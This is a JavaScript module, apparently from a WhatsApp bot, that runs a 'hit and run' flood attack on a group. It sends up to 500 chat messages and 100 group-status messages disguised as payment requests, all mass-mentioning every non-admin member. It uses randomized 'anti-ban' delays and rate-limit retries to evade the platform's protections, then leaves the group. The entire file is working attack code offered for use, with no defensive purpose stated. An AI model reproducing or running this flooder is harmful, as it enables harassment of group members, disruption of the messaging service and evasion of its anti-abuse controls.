const { relayWithBackoff } = require('./utils/relayWithBackoff');

async function executarFlood(sock, groupId) {
    try {
        const gMeta = await global.getGroupMetadata(sock, groupId);
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';

        const admins = gMeta.participants.filter(v => !!v.admin).map(v => v.id);
        const participantes = gMeta.participants
            .map(u => u.id)
            .filter(id => id !== botId && !admins.includes(id));

        const groupName = gMeta?.subject || 'Desconhecido';
        const fullText = global.mensagemDiv || 'MARCOS PASSOU O RATO 🤪';
        let statusText = fullText;

        const separadorFantasma = '【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】';
        if (statusText.includes(separadorFantasma)) {
            const parts = statusText.split(separadorFantasma);
            if (parts.length >= 3) {
                statusText = parts[0] + '\n\n' + parts.slice(2).join(separadorFantasma);
            }
        }
        statusText = statusText.replace(/```/g, '').replace(/\n{3,}/g, '\n\n').trim();

        const chatCount = 500;
        const statusCount = 100;
        const count = Math.max(chatCount, statusCount);

        console.log(`\x1b[33m[FLOOD START]\x1b[0m Grupo "\x1b[32m${groupName}\x1b[0m" | Chat: ${chatCount} | Status: ${statusCount}`);

        for (let i = 0; i < count; i++) {
            try {
                // 1. Status invisível - até 100 mensagens
                if (i < statusCount) {
                    await relayWithBackoff(sock, groupId, {
                        groupStatusMessageV2: {
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: '',
                                    amount1000: '0',
                                    noteMessage: {
                                        extendedTextMessage: {
                                            text: statusText,
                                            contextInfo: { isGroupStatus: true, mentionedJid: participantes }
                                        }
                                    },
                                    expiryTimestamp: '0',
                                    amount: { value: '0', offset: 1000, currencyCode: '' }
                                }
                            }
                        }
                    }, {}, { maxRetries: 6 });
                }

                // 2. Chat invisível - até 500 mensagens
                if (i < chatCount) {
                    await relayWithBackoff(sock, groupId, {
                        groupStatusMessageV2: {
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: 'BRL',
                                    amount1000: '10000',
                                    noteMessage: {
                                        extendedTextMessage: {
                                            text: fullText,
                                            contextInfo: { isGroupStatus: true, mentionedJid: participantes }
                                        }
                                    },
                                    expiryTimestamp: '0',
                                    amount: { value: '10000', offset: 1000, currencyCode: 'BRL' }
                                }
                            }
                        }
                    }, {}, { maxRetries: 6 });
                }

                // Delay anti-ban (600ms ~ 1200ms) — evita rate-overlimit
                const delayAntiBan = Math.floor(Math.random() * 601) + 600;
                await new Promise(r => setTimeout(r, delayAntiBan));

            } catch (err) {
                const erroStr = String(err?.message || err || '').toLowerCase();
                if (erroStr.includes('rate-overlimit') || erroStr.includes('429')) {
                    console.log(`\x1b[33m[RATE-LIMIT]\x1b[0m [${groupName}] Aguardando 3.5s...`);
                    await new Promise(r => setTimeout(r, 3500));
                } else {
                    console.error(`\x1b[31m[LOOP ERR]\x1b[0m [${groupName}] i=${i}:`, err?.message || err);
                }
            }
        }

        // HIT & RUN — sai do grupo após o flood
        console.log(`\x1b[33m[HIT & RUN]\x1b[0m [${groupName}] Flood finalizado. Saindo...`);
        try {
            await sock.groupLeave(groupId);
            console.log(`\x1b[32m[SAIU]\x1b[0m [${groupName}] Saiu com sucesso.`);
        } catch (leaveErr) {
            console.error(`\x1b[31m[ERRO LEAVE]\x1b[0m [${groupName}]:`, leaveErr.message);
        }

    } catch (err) {
        console.error(`\x1b[31m[FLOOD FATAL]\x1b[0m Erro ao executar flood:`, err.message);
    }
}

module.exports = { executarFlood };
